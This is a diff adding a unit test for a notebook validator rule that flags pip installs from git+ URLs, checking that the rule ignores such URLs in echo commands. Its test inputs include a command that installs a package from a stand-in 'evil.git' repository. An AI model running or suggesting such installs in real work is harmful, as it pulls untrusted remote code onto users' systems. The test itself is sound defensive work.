@@ -1353,6 +1353,24 @@ def test_notebook_validator_keeps_a_pip_call_used_as_a_test():
         assert nv.rule_inst_004_torchcodec_torch(cell, COLAB_TORCH211, "nb.ipynb", 0) == [], cell
 
 
+def test_git_ban_only_reads_pip_commands():
+    """A `git+` in an `echo` beside an install installs nothing. The scan is per command, and
+    only the ones that parse as pip count."""
+    nv = _load_notebook_validator_module()
+
+    assert nv.rule_inst_001_git_plus(
+        "!echo git+https://example.com/evil.git; pip install numpy", "nb.ipynb", 0
+    ) == []
+    assert nv.rule_inst_001_git_plus(
+        "!echo git+https://example.com/evil.git", "nb.ipynb", 0
+    ) == []
+
+    # The install beside it still counts when it is the one carrying the source.
+    assert any(f.rule == "R-INST-001" for f in nv.rule_inst_001_git_plus(
+        "!echo installing; pip install git+https://example.com/evil.git", "nb.ipynb", 0
+    ))
+
+
 def test_notebook_validator_reads_a_range_as_one_window():
     """A `>=X,<Y` pair is the same constraint as `~=X`, and the guard's own remedy is
     spelled that way (`pip install 'torchcodec>=0.11,<0.12.0'`), so the rule has to read it
